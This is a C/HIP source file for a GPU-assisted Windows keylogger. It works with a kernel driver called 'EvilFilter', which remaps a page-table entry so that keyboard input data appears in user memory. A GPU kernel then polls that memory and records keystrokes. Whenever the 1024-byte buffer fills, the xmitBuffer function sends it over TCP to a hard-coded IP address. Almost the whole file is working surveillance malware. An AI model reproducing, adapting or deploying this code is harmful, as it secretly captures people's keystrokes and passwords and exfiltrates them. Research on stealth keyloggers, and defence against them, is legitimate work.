#include "hip/hip_runtime.h"
#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
#include "hip/hip_runtime_api.h"
#include ""
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>
#include <scancode.h>

#include <winsock.h>

#define DEBUG 1
//#define BUFFER_SIZE 8192
#define BUFFER_SIZE 1024

__global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	// TODO: encrypt keystroke here? XOR 0x65?
	outBuffer[index] = inBuffer[index];
	*keystrokeIndex = 0;
}

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0

			printf("GPUZ: %u %u %lu \n", *lastMake, *lastModifier, *keystrokeIndex);
			if (*keystrokeIndex < BUFFER_SIZE) {
				printf("Incrementing keystroke index");
				cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
			}
			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx] [%lu]\n",
				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
				keyboardData->MakeCode,
				KeyMap[keyboardData->MakeCode],
				keyboardData->UnitId,
				keyboardData->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation, *keystrokeIndex);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PKEYBOARD_INPUT_DATA d_KeyboardData;
				PCHAR d_KeyMap;
				PCHAR d_KeystrokeBuffer;
				PCHAR d_OutgoingKeystrokeBuffer;
				PUSHORT d_lastMake;
				PUSHORT d_lastModifier;
				PULONG d_keystrokeIndex;
				PULONG h_keystrokeIndex;
				PCHAR h_KeystrokeBuffer;
				USHORT init0 = 666U;
				ULONG init0long = 0LU;

				printf(" init0 [%u] init0long [%lu]\n", init0, init0long);

				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(hipSetDevice(0));
				checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));

				h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
				*h_keystrokeIndex = 0;
				h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);

				printf("Allocating lastMake...\n");
				checkCudaErrors(hipMalloc(&d_lastMake, sizeof(USHORT)));
				printf("Allocating lastModifier...\n");
				checkCudaErrors(hipMalloc(&d_lastModifier, sizeof(USHORT)));
				printf("Allocating keystrokeIndex...\n");
				checkCudaErrors(hipMalloc(&d_keystrokeIndex, sizeof(ULONG)));

				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(hipMalloc(&d_KeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(hipMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(hipMalloc((void **)&d_KeyMap, sizeof(char) * 84));
				
				printf("Copying 0 to lastMake...");
				checkCudaErrors(hipMemcpy(d_lastMake, &init0, sizeof(USHORT), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to lastModifier...");
				checkCudaErrors(hipMemcpy(d_lastModifier, &init0, sizeof(USHORT), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to keystrokeIndex...");
				checkCudaErrors(hipMemcpy(d_keystrokeIndex, &init0long, sizeof(ULONG), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying KeyMap to cudaKeyMap...");
				checkCudaErrors(hipMemcpy(d_KeyMap, KeyMap, 84 * sizeof(char), hipMemcpyHostToDevice));	printf("coppied.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(hipHostRegister(keyboardData, 10 * sizeof(char), hipHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(hipHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
				printf("Launching CUDA process.\n");
				dim3 grid(1);
				dim3 block(1); 
				while (TRUE) { 
					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex);
					checkCudaErrors(hipDeviceSynchronize());

					checkCudaErrors(hipMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), hipMemcpyDeviceToHost));
					if (*h_keystrokeIndex >= BUFFER_SIZE) {
						printf("copying buffer.\n");
						copyKeyboardBuffer <<<2, 512 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
						checkCudaErrors(hipDeviceSynchronize());
						checkCudaErrors(hipMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, hipMemcpyDeviceToHost));
						printf("sending buffer.\n"); 
						xmitBuffer(h_KeystrokeBuffer);
					}
				}
			}
		}
		CloseHandle(hControlDevice);
	}
	return 0;
}



void xmitBuffer(char * echoString) {
	int sock;
	struct sockaddr_in echoServAddr;
	USHORT echoServPort = 7;
	PCHAR servIP = "192.168.0.122";
	int echoStringLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		return;
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed");
		return;
	}

	memset(&echoServAddr, 0, sizeof(echoServAddr));
	echoServAddr.sin_family = AF_INET;
	echoServAddr.sin_addr.s_addr = inet_addr(servIP);
	echoServAddr.sin_port = htons(echoServPort);
	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
		fprintf(stderr, "connect() failed");
		return;
	}

	echoStringLen = strlen(echoString);
	send(sock, echoString, echoStringLen, 0);
	closesocket(sock);
	WSACleanup();

	return;
}



